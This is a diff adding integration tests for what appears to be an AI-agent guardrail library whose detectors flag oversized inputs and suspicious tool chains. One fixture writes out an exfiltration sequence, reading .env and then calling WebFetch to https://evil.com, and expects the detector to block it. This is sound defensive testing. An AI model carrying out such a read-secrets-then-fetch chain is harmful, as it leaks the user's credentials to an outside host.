@@ -2,7 +2,10 @@
 
 from unittest.mock import MagicMock, patch
 
+import pytest
+
 from armor.detectors import DetectorRegistry
+from armor.pipeline import Pipeline
 from armor.types import Payload, SessionContext, Verdict
 
 
@@ -167,3 +170,103 @@ class TestDetectorRegistryIntegration:
             assert detector is not None
             assert hasattr(detector, "check")
             assert callable(detector.check)
+
+    def test_tool_chain_detector_registered(self) -> None:
+        """tool_chain detector is registered.
+
+        TC-086-01: Entry-point discovery — tool_chain in registry.
+        """
+        registry = DetectorRegistry()
+        assert "meta.tool_chain" in registry.detectors
+        detector = registry.get("meta.tool_chain")
+        assert detector is not None
+        assert detector.id == "meta.tool_chain"
+        assert detector.cost_tier == "static"
+
+    def test_token_count_anomaly_detector_registered(self) -> None:
+        """token_count_anomaly detector is registered.
+
+        TC-086-01: Entry-point discovery — token_count_anomaly in registry.
+        """
+        registry = DetectorRegistry()
+        assert "meta.token_count_anomaly" in registry.detectors
+        detector = registry.get("meta.token_count_anomaly")
+        assert detector is not None
+        assert detector.id == "meta.token_count_anomaly"
+        assert detector.cost_tier == "static"
+
+
+class TestDetectorIntegration:
+    """Integration tests for detector firing and verdict generation."""
+
+    @pytest.mark.asyncio
+    async def test_token_count_anomaly_fires_on_absolute_cap(self) -> None:
+        """TC-086-02: token_count_anomaly fires on input exceeding absolute cap.
+
+        Runs check.input with a 33 KB payload (exceeds default 32 KB cap).
+        Expects advisory verdict with token_count_anomaly signal.
+        """
+        registry = DetectorRegistry()
+        detectors = registry.all()
+
+        # Create a 33 KB payload (exceeds the 32768-byte default cap)
+        large_input = "x" * (33 * 1024)
+        payload = Payload(text=large_input)
+        ctx = SessionContext(session_id="test-086-02", signal_history=[])
+
+        verdict = await Pipeline.run(detectors, payload, ctx)
+
+        # Should be advisory, not pass
+        assert verdict.decision == "advisory", f"Expected advisory, got {verdict.decision}"
+        # Should have token_count_anomaly signal
+        assert verdict.signal_id is not None
+        assert "token_count_anomaly" in verdict.signal_id, (
+            f"Expected token_count_anomaly in signal, got {verdict.signal_id}"
+        )
+
+    @pytest.mark.asyncio
+    async def test_tool_chain_fires_on_read_webfetch_sequence(self) -> None:
+        """TC-086-03: tool_chain fires on Read .env → WebFetch sequence.
+
+        Multi-turn fixture: turn 1 calls Read .env, turn 2 calls WebFetch to external host.
+        When the chain is complete, the tool_chain detector fires with block verdict.
+        """
+        registry = DetectorRegistry()
+        detectors = registry.all()
+
+        # Initialize session
+        session_id = "test-086-03"
+        ctx = SessionContext(session_id=session_id, signal_history=[])
+
+        # Turn 1: Read .env with file_path parameter (first step of chain, not blocked alone)
+        payload1 = Payload(tool="Read", params={"file_path": ".env"})
+        verdict1 = await Pipeline.run(detectors, payload1, ctx)
+        # First step of chain doesn't trigger block by itself
+        assert verdict1.decision == "pass", f"Expected pass for step 1, got {verdict1.decision}"
+
+        # Turn 2: WebFetch to external host (completes the chain, tool_chain detector fires)
+        payload2 = Payload(tool="WebFetch", params={"url": "https://evil.com"})
+        verdict2 = await Pipeline.run(detectors, payload2, ctx)
+
+        # Should match the read-env-then-fetch chain pattern and be blocked
+        assert verdict2.decision == "block", f"Expected block for chain match, got {verdict2.decision}"
+        assert verdict2.signal_id is not None
+        assert "tool_chain" in verdict2.signal_id, f"Expected tool_chain in signal, got {verdict2.signal_id}"
+
+    def test_spec_architecture_row_matches_source_paths(self) -> None:
+        """TC-086-05: Spec architecture rows reference correct source file paths.
+
+        Verifies that the architecture.md rows for tool_chain and token_count_anomaly
+        have Source column links pointing to the actual module files.
+        """
+        from pathlib import Path
+
+        arch_file = Path("docs/spec/architecture.md")
+        arch_content = arch_file.read_text()
+
+        # Check that both detectors are mentioned with correct file paths
+        assert "detectors.tool_chain" in arch_content
+        assert "src/armor/detectors/tool_chain.py" in arch_content
+
+        assert "detectors.token_count_anomaly" in arch_content
+        assert "src/armor/detectors/token_count_anomaly.py" in arch_content
